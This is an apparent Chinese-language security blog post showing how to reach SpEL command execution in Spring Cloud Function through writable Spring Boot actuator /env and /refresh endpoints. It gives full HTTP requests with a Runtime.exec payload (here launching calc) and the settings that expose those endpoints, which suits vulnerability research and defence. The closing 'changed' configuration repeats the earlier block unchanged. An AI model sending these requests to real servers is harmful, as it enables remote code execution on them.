# Spring-Cloud-Function SPEL Injection With actuator

[spring cloud function 最新3.2.3 版本 trick](http://mp.weixin.qq.com/s?__biz=MzIzMjYzNTQwMA==&mid=2247484293&idx=1&sn=1e7caeadd778fae640a0f339652ef968&chksm=e890aee2dfe727f446398470d5663de97104ca7e3e8676f69e61fb3f2a2b66c7e0f2aca6246b&scene=21#wechat_redirect) 这篇文章里，分析了Spring Coud Function 官方在最新版本3.2.3 里配置文件中的spring.cloud.function.routingExpression参数存在SPEL注入点，因此理论上只要能够控制functionProperties.getRoutingExpression() 的值就能够触发这个漏洞。

当然修改配置文件中的参数能够导致命令执行严格意义上并不能算是Spring-cloud-function的漏洞。那么在实际环境中如何来控制配置文件中的spring.cloud.function.routingExpression参数呢？想起来Spring Boot actuator 的 env 端点是能够更改环境变量属性信息的。

  

请求/env端点，写入配置：

*   
*   
*   
*   
*   
*   
*   

```
POST /actuator/env HTTP/1.1Host: 127.0.0.1:9000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0Content-Type: application/jsonContent-Length: 109
{"name":"spring.cloud.function.routingExpression","value":"T(java.lang.Runtime).getRuntime().exec('calc')"}
```

请求/refresh端点，刷新配置生效：

*   
*   
*   

```
POST /actuator/refresh HTTP/1.1Host: 127.0.0.1:9000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
```

![](../Images/5bdd0ad5a534519f0d9f1415a193d843.png)

最后请求/functionRouter 执行routingExpression

![](../Images/a884b2e09f7b8450156eef4f88daa291.png)

  

需要注意的是：actuator 2.x 需要将env 和refresh 端点暴露出来，还有就是env 端点可写的特性是在Spring Cloud才具有的。

*   
*   
*   

```
management.endpoint.refresh.enabled=truemanagement.endpoint.env.post.enabled=truemanagement.endpoints.web.exposure.include=env,restart,refresh
```

  

  

另外如果遇到了“POST /actuator/env returns 405 method not allowed”，表示env 端点不允许POST提交数据。这个是因为Spring Cloud 在Hoxton.SR3版本已经将env 端点的可写性做了一些改变（https://github.com/spring-projects/spring-boot/issues/20509），需要改成：

*   
*   
*   

```
management.endpoint.refresh.enabled=truemanagement.endpoint.env.post.enabled=truemanagement.endpoints.web.exposure.include=env,restart,refresh
```
